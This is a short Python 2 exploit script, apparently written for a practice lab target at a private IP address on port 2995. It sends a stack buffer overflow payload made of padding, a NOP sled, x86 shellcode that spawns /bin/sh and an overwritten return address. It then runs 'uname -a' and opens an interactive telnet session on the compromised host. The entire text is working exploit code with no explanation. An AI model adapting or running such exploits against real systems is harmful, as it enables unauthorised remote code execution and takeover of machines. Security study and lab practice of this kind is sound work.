#!/usr/bin/python2

import socket
import struct
import telnetlib

ip = "192.168.56.102"
port = 2995

overflow = 'A' * 512 + '\0aaaabbbbccccddddeee'
eip = struct.pack("<I", 0xbffffa6c) 
nopsled = '\x90' * 128
shellcode = "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\xC1\x89\xC2\xB0\x0B\xCD\x80\x31\xC0\x40\xCD\x80"

exploit = "\0" + nopsled + shellcode + 'a' * (len(overflow) - len(nopsled) - len(shellcode) - 1) + eip


sock = socket.socket()
sock.connect((ip, port))

sock.send(exploit + "\n")
sock.send("uname -a \n")
print sock.recv(1024)


t = telnetlib.Telnet()
t.sock = sock
t.interact()
